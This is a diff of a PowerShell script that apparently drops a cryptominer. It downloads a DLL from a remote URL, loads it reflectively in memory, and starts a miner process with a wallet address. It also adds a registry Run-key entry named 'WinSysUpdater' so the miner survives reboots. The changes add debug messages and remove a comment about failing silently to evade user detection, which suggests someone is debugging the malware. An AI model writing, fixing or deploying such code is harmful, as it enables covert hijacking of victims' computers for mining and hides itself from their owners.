@@ -50,6 +50,7 @@ try {
     }
 
     # --- REFLECTIVE LOADING ---
+    Write-Host "[*] Triggering Bridge.dll Reflective Load..."
     $dllBytes = $wc.DownloadData($DllUrl)
     $assembly = [System.Reflection.Assembly]::Load($dllBytes)
     $loader = $assembly.GetType("DateFundLoader")
@@ -58,9 +59,11 @@ try {
     # Pass the actual GPU path if detected, otherwise null
     $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
     # Added [object[]] casting to properly map args to C# MethodInfo.Invoke
+    Write-Host "[*] Invoking Miner Process..."
     $startMethod.Invoke($null, [object[]]@($CpuExe, $GpuArg, $Wallet))
     
     # --- PERSISTENCE ---
+    Write-Host "[*] Hooking Registry..."
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $Name = "WinSysUpdater"
     # Escaped the quotes correctly and isolated the url
@@ -70,5 +73,5 @@ try {
     Write-Host "working"
 
 } catch {
-    # Fail silently to evade user detection
+    Write-Host "CRASHED: $($_.Exception.Message)"
 }
